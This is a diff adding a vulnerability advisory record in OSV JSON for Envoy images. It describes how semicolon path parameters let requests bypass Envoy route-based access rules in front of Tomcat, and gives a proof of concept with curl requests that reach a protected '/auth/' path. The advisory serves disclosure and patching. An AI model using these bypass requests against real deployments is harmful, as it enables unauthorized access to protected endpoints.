@@ -1,0 +1,231 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-phsn-2m5p-xrgo-o5tl",
+  "modified": "2026-09-21T16:23:16Z",
+  "published": "2026-09-21T16:23:16Z",
+  "upstream": [
+    "CVE-2026-73511"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\r\nBy default Envoy matches HTTP routes on the raw `:path`. With the `ignore_path_parameters_in_path_matching` route-configuration option, it instead strips everything after the first semicolon before matching. However, some backends strip `;params` per path segment before resolving the request, thus disagreeing with both matching modes available in Envoy.\r\nFor these backends, Envoy features can be bypassed. For example, in certain deployments, an authentication bypass might be possible.\r\n\r\n### Details\r\nEnvoy matches routes on the raw `:path`. Some backends, for example Apache Tomcat and other servlet containers, instead strip `;params` per path segment before resolving the request (RFC 3986 §3.3 acknowledges such per-segment parameters but leaves stripping implementation-defined), so the two disagree and a path-based access decision in Envoy can be bypassed.\r\nThe existing mitigation `ignore_path_parameters_in_path_matching` does not fully close this: it implements the pre-RFC 3986 (RFC 1808) model, truncating everything from the first `;` to the end of the whole path \r\n\r\n(`source/common/router/config_impl.h`, `RouteMatchContext::stripPathParams: path.find(';') + substr(0, pos)`, applied in `sanitizedPath()` / `sanitizedPathWithoutQuery()`). It therefore only handles a single trailing params section and over-truncates when a `;` is on a non-terminal segment.  (Note `RouteEntryImplBase::sanitizePathBeforePathMatching` in `config_impl.cc` has identical semantics but its only remaining call site is inside1 an `ASSERT`)\r\n\r\nNote there is currently no extension point for this: the `PathTransformation` API (`type/http/v3/path_transformation.proto`) only offers `NormalizePathRFC3986` and `MergeSlashes`, neither of which removes matrix parameters.\r\n\r\n### PoC\r\nEnvoy with two routes: /auth/ and / as a fallback. On /auth/, we configure a direct response to illustrate a client who cannot access a route due to missing authentication. This could obviously be any feature that is configured on specific routes.\r\n\r\nAs a backend, we use a Tomcat backend as this is probably the most well-known backend implementing the removal of path (matrix) parameters per path segment. There are two webapps deployed on the Tomcat server. One at the /auth/ path, which should not be reachable since Envoy sends back a direct response, and one open application at /.\r\n\r\n#### Envoy configuration\r\n```yaml\r\nstatic_resources:\r\n  listeners:\r\n  - name: l0\r\n    address: { socket_address: { address: 0.0.0.0, port_value: 10000 } }\r\n    filter_chains:\r\n    - filters:\r\n      - name: envoy.filters.network.http_connection_manager\r\n        typed_config:\r\n          \"@type\": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\r\n          stat_prefix: ingress_http\r\n          normalize_path: true\r\n          merge_slashes: true\r\n          route_config:\r\n            name: r\r\n            # (set ignore_path_parameters_in_path_matching: true here to test the option)\r\n            virtual_hosts:\r\n            - name: vh\r\n              domains: [\"*\"]\r\n              routes:\r\n              - match: { prefix: \"/auth/\" }\r\n                direct_response: { status: 403, body: { inline_string: \"blocked\\n\" } }\r\n              - match: { prefix: \"/\" }\r\n                route: { cluster: backend }\r\n        http_filters:\r\n        - name: envoy.filters.http.router\r\n          typed_config:\r\n            \"@type\": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router\r\n  clusters:\r\n  - name: backend\r\n    type: STRICT_DNS\r\n    load_assignment:\r\n      cluster_name: backend\r\n      endpoints:\r\n      - lb_endpoints:\r\n        - endpoint: { address: { socket_address: { address: 127.0.0.1, port_value: 8080 } } }\r\n```\r\n\r\n#### Tomcat configuration\r\n```bash\r\ndocker run --rm -p 8080:8080 tomcat:9.0 /bin/bash -c \\\r\n  \"mkdir -p webapps/ROOT webapps/auth && \\\r\n   echo ROOT > webapps/ROOT/index.html && \\\r\n   echo SECRET > webapps/auth/index.html && catalina.sh run\"\r\n```\r\n\r\nDeploying this setup, we can see that standard requests to /auth/ trigger the direct response. But as soon as we include parameters in the /auth/ path segment, Envoy matches the whole path and therefore uses the fallback route /. Tomcat, on the other hand, strips the path parameter and allows access to the webapp that should be unreachable.\r\n\r\n```bash\r\n# standard case correctly blocked\r\ncurl --path-as-is http://localhost:10000/auth/        # -> 403 (Envoy)\r\n\r\n# matrix param on the protected segment bypasses the /auth/ rule\r\ncurl --path-as-is http://localhost:10000/auth;x=y/    # -> 200 SECRET\r\n#   Envoy matches literal \"/auth;x=y/\" (!= \"/auth/\") -> falls through to\r\n#   backend; Tomcat strips \";x=y\" per segment -> resolves \"/auth/\".\r\n\r\n# If ignore_path_parameters_in_path_matching: true is set -> still bypassable\r\n# via a matrix param on a NON-terminal segment\r\ncurl --path-as-is http://localhost:10000/;x=y/auth/   # -> 200 SECRET\r\n#   stripPathParams finds the first ';' at index 1 and\r\n#   truncates to \"/\", so Envoy matches \"/\"; Tomcat resolves \"/auth/\".\r\n\r\n# and it over-truncates:\r\ncurl --path-as-is http://localhost:10000/auth;x=y/sub # Envoy sees \"/auth\",\r\n#   Tomcat resolves \"/auth/sub\".\r\n```\r\n\r\n### Impact\r\nIn my understanding, RFC 3986 section 3.3 leaves it open whether path parameters should be stripped from path segments or not, but for backends that do, the combination with Envoy allows the bypassing of Envoy features and path-matching confusion.\r\n\r\nTo emphasize: the bypass requires two conditions to hold together: (1) Envoy makes a path-based decision, and (2) the backend strips `;params` per segment.\r\nThe `direct_response` in the PoC is only a stand-in; in real deployments the same path match typically drives a security decision, for example RBAC `http`-filter path rules, `ext_authz` using the request path, or routing `/auth/` (or `/admin/`) to an authenticated endpoint while other paths go to a public one.\r\n\r\nWhere Envoy path matching only drives routing, the effect may be benign path-resolution confusion. Where it drives an authorization decision in front of a per-segment backend, an attacker can reach a protected path, i.e. an authentication or authorization bypass.\r\n\r\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "envoy",
+        "purl": "pkg:docker/dhi/envoy?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "1.31.10-debian12",
+        "1.31.8-debian12",
+        "1.31.9-debian12",
+        "1.32.10-debian12",
+        "1.32.6-debian12",
+        "1.32.7-debian12",
+        "1.32.8-debian12",
+        "1.32.9-debian12",
+        "1.33.3-debian12",
+        "1.33.4-debian12",
+        "1.33.5-debian12",
+        "1.33.6-debian12",
+        "1.33.7-debian12",
+        "1.34.1-debian12",
+        "1.34.2-debian12",
+        "1.34.3-debian12",
+        "1.34.4-debian12",
+        "1.34.5-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "envoy",
+        "purl": "pkg:docker/dhi/envoy?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.31.10-debian13",
+        "1.32.10-debian13",
+        "1.32.11-debian13",
+        "1.32.12-debian13",
+        "1.32.13-debian13",
+        "1.33.10-debian13",
+        "1.33.11-debian13",
+        "1.33.12-debian13",
+        "1.33.13-debian13",
+        "1.33.14-debian13",
+        "1.33.14-debian13-dev",
+        "1.33.7-debian13",
+        "1.33.8-debian13",
+        "1.33.9-debian13",
+        "1.34.10-debian13",
+        "1.34.11-debian13",
+        "1.34.12-debian13",
+        "1.34.12-debian13-dev",
+        "1.34.13-debian13",
+        "1.34.13-debian13-dev",
+        "1.34.14-debian13",
+        "1.34.14-debian13-dev",
+        "1.34.5-debian13",
+        "1.34.6-debian13",
+        "1.34.7-debian13",
+        "1.34.8-debian13",
+        "1.34.9-debian13",
+        "1.35.10-debian13",
+        "1.35.10-debian13-dev",
+        "1.35.10-debian13-fips",
+        "1.35.10-debian13-fips-dev",
+        "1.35.11-debian13",
+        "1.35.11-debian13-dev",
+        "1.35.11-debian13-fips",
+        "1.35.11-debian13-fips-dev",
+        "1.35.12-debian13",
+        "1.35.12-debian13-dev",
+        "1.35.12-debian13-fips",
+        "1.35.12-debian13-fips-dev",
+        "1.35.13-debian13",
+        "1.35.13-debian13-dev",
+        "1.35.13-debian13-fips",
+        "1.35.13-debian13-fips-dev",
+        "1.35.2-debian13",
+        "1.35.3-debian13",
+        "1.35.4-debian13",
+        "1.35.5-debian13",
+        "1.35.6-debian13",
+        "1.35.7-debian13",
+        "1.35.8-debian13",
+        "1.35.8-debian13-dev",
+        "1.35.9-debian13",
+        "1.35.9-debian13-dev",
+        "1.36.2-debian13",
+        "1.36.4-debian13",
+        "1.36.4-debian13-dev",
+        "1.36.5-debian13",
+        "1.36.5-debian13-dev",
+        "1.36.6-debian13",
+        "1.36.6-debian13-dev",
+        "1.36.6-debian13-fips",
+        "1.36.6-debian13-fips-dev",
+        "1.36.7-debian13",
+        "1.36.7-debian13-dev",
+        "1.36.7-debian13-fips",
+        "1.36.7-debian13-fips-dev",
+        "1.36.8-debian13",
+        "1.36.8-debian13-dev",
+        "1.36.8-debian13-fips",
+        "1.36.8-debian13-fips-dev",
+        "1.36.9-debian13",
+        "1.36.9-debian13-dev",
+        "1.36.9-debian13-fips",
+        "1.36.9-debian13-fips-dev",
+        "1.37.0-debian13",
+        "1.37.0-debian13-dev",
+        "1.37.1-debian13",
+        "1.37.1-debian13-dev",
+        "1.37.2-debian13",
+        "1.37.2-debian13-dev",
+        "1.37.2-debian13-fips",
+        "1.37.2-debian13-fips-dev",
+        "1.37.3-debian13",
+        "1.37.3-debian13-dev",
+        "1.37.3-debian13-fips",
+        "1.37.3-debian13-fips-dev",
+        "1.37.4-debian13",
+        "1.37.4-debian13-dev",
+        "1.37.4-debian13-fips",
+        "1.37.4-debian13-fips-dev",
+        "1.37.5-debian13",
+        "1.37.5-debian13-dev",
+        "1.37.5-debian13-fips",
+        "1.37.5-debian13-fips-dev",
+        "1.38.0-debian13",
+        "1.38.0-debian13-dev",
+        "1.38.0-debian13-fips",
+        "1.38.0-debian13-fips-dev",
+        "1.38.1-debian13",
+        "1.38.1-debian13-dev",
+        "1.38.1-debian13-fips",
+        "1.38.1-debian13-fips-dev",
+        "1.38.2-debian13",
+        "1.38.2-debian13-dev",
+        "1.38.2-debian13-fips",
+        "1.38.2-debian13-fips-dev",
+        "1.38.3-debian13",
+        "1.38.3-debian13-dev",
+        "1.38.3-debian13-fips",
+        "1.38.3-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-phsn-2m5p-xrgo-o5tl"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-m745-gh6x-349x"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://alas.aws.amazon.com/AL2023/ALAS-2026-2149.html"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-73553"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-73552"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-73551"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-73550"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-73549"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-73548"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-73547"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-73546"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-73513"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-73512"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-73511"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-50572"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-48521"
+    }
+  ]
+}
